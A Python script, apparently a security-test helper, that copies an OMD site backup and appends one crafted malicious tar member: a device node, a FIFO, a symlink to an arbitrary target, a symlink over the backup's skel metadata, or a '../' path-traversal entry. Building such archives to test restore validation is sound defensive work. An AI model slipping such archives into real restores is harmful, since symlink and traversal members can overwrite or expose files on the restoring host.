#!/usr/bin/env python3
"""Copy an OMD backup and append one malicious tar member.

Usage: craft-security-backup.py SRC DST SITE KIND [TARGET]

KIND is one of: char, fifo, symlink, skel-symlink.
- char:        character device node
- fifo:        named pipe
- symlink:     symlink at SITE/local/evil-link -> TARGET
- skel-symlink: SITE/.backup_meta/skel -> TARGET
- traversal:   SITE/../evil-traversal
"""

import io
import sys
import tarfile


def main():
    if len(sys.argv) not in (5, 6):
        raise SystemExit(__doc__)
    src, dst, site, kind = sys.argv[1:5]
    target = sys.argv[5] if len(sys.argv) == 6 else ""

    with tarfile.open(src, "r:gz") as tin, tarfile.open(dst, "w:gz") as tout:
        for member in tin:
            data = tin.extractfile(member) if member.isreg() else None
            tout.addfile(member, data)

        if kind == "char":
            info = tarfile.TarInfo(site + "/evil-char")
            info.type = tarfile.CHRTYPE
            info.mode = 0o600
            info.devmajor = 1
            info.devminor = 3
        elif kind == "fifo":
            info = tarfile.TarInfo(site + "/evil-fifo")
            info.type = tarfile.FIFOTYPE
            info.mode = 0o600
        elif kind == "symlink":
            info = tarfile.TarInfo(site + "/local/evil-link")
            info.type = tarfile.SYMTYPE
            info.linkname = target
            info.mode = 0o777
        elif kind == "skel-symlink":
            info = tarfile.TarInfo(site + "/.backup_meta/skel")
            info.type = tarfile.SYMTYPE
            info.linkname = target
            info.mode = 0o777
        elif kind == "traversal":
            info = tarfile.TarInfo(site + "/../evil-traversal")
            info.type = tarfile.REGTYPE
            info.mode = 0o644
            payload = b"path traversal\n"
            info.size = len(payload)
            tout.addfile(info, io.BytesIO(payload))
            return
        else:
            raise SystemExit("unknown kind: " + kind)

        tout.addfile(info)


if __name__ == "__main__":
    main()
